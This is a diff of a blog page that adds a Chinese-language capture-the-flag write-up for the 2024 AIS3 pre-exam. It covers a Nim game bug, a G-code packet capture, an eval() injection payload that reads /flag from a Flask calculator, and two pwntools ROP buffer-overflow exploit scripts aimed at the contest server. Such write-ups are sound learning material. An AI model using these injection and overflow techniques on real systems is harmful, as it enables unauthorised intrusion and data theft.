@@ -3,7 +3,7 @@
 <html lang="zh-TW">
 <head>
     <meta charset="utf-8" />
-    <title>tags | 此情吳計可消除</title>
+    <title>2024 AIS3 pre-exam | 此情吳計可消除</title>
     <meta name="author" content="yih-0118" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -42,6 +42,10 @@
 
 
 <script src="/js/lib/preview.js"></script>
+
+
+
+
 
 
 
@@ -168,45 +172,151 @@
     <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
 </transition>
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
-            <div id="archives">
-    
-    <div class="categories-tags">
+            <div class="article">
+    <div>
+        <h1>2024 AIS3 pre-exam</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/27
+        </span>
         
-        
-        
-        <span>
-            <a href="/tags/%E6%B8%AC%E8%A9%A6/" style="background: #03a9f4">
+        <span class="category">
+            <a href="/categories/AIS3/">
                 <span class="icon">
-                    <i class="fa-solid fa-tags fa-fw"></i>
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
                 </span>
-                測試
+                AIS3
             </a>
         </span>
         
         
-        
-        <span>
-            <a href="/tags/writeup/" style="background: #00a596">
-                <span class="icon">
-                    <i class="fa-solid fa-tags fa-fw"></i>
-                </span>
-                writeup
-            </a>
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/writeup/" style="color: #03a9f4">
+                    writeup
+                </a>
+            </span>
+            
         </span>
-        
-        
-        
-        <span>
-            <a href="/tags/%E4%B8%8D%E7%9F%A5%E9%81%93/" style="background: #ffa2c4">
-                <span class="icon">
-                    <i class="fa-solid fa-tags fa-fw"></i>
-                </span>
-                不知道
-            </a>
-        </span>
-        
         
     </div>
+    
+    <div class="content" v-pre>
+        <h2 id="Welcome"><a href="#Welcome" class="headerlink" title="[Welcome]"></a>[Welcome]</h2><p>flag就放在題目裡，我沒有截下來</p>
+<span id="more"></span>
+<h2 id="Quantum-Nim-Heist"><a href="#Quantum-Nim-Heist" class="headerlink" title="[Quantum Nim Heist]"></a>[Quantum Nim Heist]</h2><p>會發現是一個叫你拿石頭的遊戲</p>
+<pre><code>yih_0118@Macbook Downloads % nc chals1.ais3.org 40004
++-------------------- welcome --------------------+
+| omg hi!                                         |
+|                                                 |
+| welcome to microchess, the minimal online chess |
+| platform.                                       |
+| i am a super powerful chess AI!                 |
+| can you win against me and get the flag?        |
++---+--------------- main menu -------------------+
+| 0 | read the rules of the game                  |
+| 1 | start a new game against me                 |
+| 2 | load a saved game                           |
+| 3 | leave                                       |
++---+---------------------------------------------+
+</code></pre>
+<p>有一個技巧，當拿到兩個樁各剩一顆，然後跟他套，誒我要拿石頭但是輸入值一直是0</p>
+<pre><code>+---+-------------- stones info ------------------+
+| 0 | o                                           |
+| 1 | o                                           |
++---+--------------- game menu -------------------+
+| 0 | make a move                                 |
+| 1 | save the current game and leave             |
+| 2 | resign the game                             |
++---+---------------------------------------------+
+it&#39;s your turn to move! what do you choose? 0
+which pile do you choose? 0
+how many stones do you remove? 0
+</code></pre>
+<p>然後再試一下，我每次輸入001就過了</p>
+<pre><code>it&#39;s your turn to move! what do you choose? 0
+which pile do you choose? 0
+how many stones do you remove? 1
++---------------- congratulations ----------------+
+| you are a true grandmaster of chess! here is    |
+| the flag for you:                               |
+| AIS3&#123;Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?&#125;  |
++-------------------------------------------------+
+</code></pre>
+<h2 id="Three-Dimensional-Secret"><a href="#Three-Dimensional-Secret" class="headerlink" title="[Three Dimensional Secret]"></a>[Three Dimensional Secret]</h2><p>他會給你一個網路封包，丟到wireshark去看看<br>stream出來後會發現好像是G-code然後可以丟到個網站<br><img src="https://hackmd.io/_uploads/BJ4tRfEVR.png" alt="image"></p>
+<p><a target="_blank" rel="noopener" href="https://ncviewer.com/">網頁連結</a><br><img src="https://hackmd.io/_uploads/H1M6RzE4R.png" alt="image"><br>就出來了</p>
+<h2 id="Evil-Calculator"><a href="#Evil-Calculator" class="headerlink" title="[Evil Calculator]"></a>[Evil Calculator]</h2><p>發現是一個神奇的計算機<br><img src="https://hackmd.io/_uploads/BJBf8zEVA.png" alt="image"><br>假如我按下<code>1+1</code>再按下等於，我用burp suite去攔截會發現是一個json格式的東東<br><img src="https://hackmd.io/_uploads/Hkq2wfNVC.png" alt="image"><br>去看一下<code>app.js</code>裡面有什麼洞可以鑽</p>
+<pre><code class="python">@app.route(&#39;/calculate&#39;, methods=[&#39;POST&#39;])
+def calculate():
+    data = request.json
+    expression = data[&#39;expression&#39;].replace(&quot; &quot;,&quot;&quot;).replace(&quot;_&quot;,&quot;&quot;)
+    try:
+        result = eval(expression)
+    except Exception as e:
+        result = str(e)
+    return jsonify(result=str(result))
+</code></pre>
+<p>發現用eval()可以去鑽，直接出入指令去求出flag<br>可以使用burp suite的repeater去看回覆<br><img src="https://hackmd.io/_uploads/BJF1cfVVR.png" alt="image"><br>那我們把expression改成<code>&quot;open(&#39;/flag&#39;, &#39;r&#39;).read()&quot;</code><br>然後就出來了<br><img src="https://hackmd.io/_uploads/SJdR5M44C.png" alt="image"></p>
+<h2 id="Mathter"><a href="#Mathter" class="headerlink" title="[Mathter]"></a>[Mathter]</h2><p><img src="https://hackmd.io/_uploads/SJcMx0bEA.png" alt="image"><br>進去goodbye看一下<br><img src="https://hackmd.io/_uploads/HJ2Bl0b4A.png" alt="image"><br>ㄟ竟然有gets，可以overflow<br>發現是v1[4] 所以要打12進去<br><img src="https://hackmd.io/_uploads/SkXS-0ZNC.png" alt="image"><br>有兩個神奇函數，繞進去好了?<br><img src="https://hackmd.io/_uploads/HJKQkGNN0.png" alt="image"><br>觀察一下win1<br>發現-559038737會是0xDEADBEEF<br><img src="https://hackmd.io/_uploads/BJ8rGzEEA.png" alt="image"><br>觀察一下win2<br>發現-889275714會是0xcafebabe</p>
+<pre><code class="python">from pwn import *
+r = remote(&quot;chals1.ais3.org&quot; ,50001)
+r.recvuntil(b&#39;:&#39;)
+r.sendline(b&#39;q&#39;)
+r.recvlines(2)
+padding = b&#39;a&#39; * 12
+elf = ELF(&#39;./mathter&#39;)
+rop = ROP(elf)
+pop_rdi = rop.find_gadget([&#39;pop rdi&#39;, &#39;ret&#39;])[0]
+arg = 0xdeadbeef
+win1 = elf.symbols[&#39;win1&#39;]
+payload = padding
+payload += p64(pop_rdi)
+payload += p64(arg)
+payload += p64(win1)
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<p><img src="https://hackmd.io/_uploads/SyztgCWEC.png" alt="image"><br>得出上半部</p>
+<pre><code class="python">from pwn import *
+r = remote(&quot;chals1.ais3.org&quot;, 50001)
+r.recvuntil(b&#39;:&#39;)
+r.sendline(b&#39;q&#39;)
+r.recvlines(2)
+padding = b&#39;a&#39; * 12
+elf = ELF(&#39;./mathter&#39;)
+rop = ROP(elf)
+pop_rdi = rop.find_gadget([&#39;pop rdi&#39;, &#39;ret&#39;])[0]
+arg = 0xcafebabe
+win2 = elf.symbols[&#39;win2&#39;]
+payload = padding
+payload += p64(pop_rdi)
+payload += p64(arg)
+payload += p64(win2)
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<p>得出下半部</p>
+<p><img src="https://hackmd.io/_uploads/SJGxZAZVC.png" alt="image"><br>相同部分就刪掉吧</p>
+<p>FLAG:<code>AIS3&#123;0mg_k4zm4_mu57_b3_k1dd1ng_m3_2e89c9&#125;</code></p>
+<h2 id="成績爛掉但還有正取上"><a href="#成績爛掉但還有正取上" class="headerlink" title="成績爛掉但還有正取上"></a>成績爛掉但還有正取上</h2><p><img src="https://hackmd.io/_uploads/rkGQ1lk_0.png" alt="image"><br><img src="https://hackmd.io/_uploads/By5nyx1_R.png" alt="image"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
     
 </div>
 
@@ -238,6 +348,12 @@
         
     </div>
     <script src="/js/main.js"></script>
+    
+    
+
+
+
+
     
 </body>
 </html>
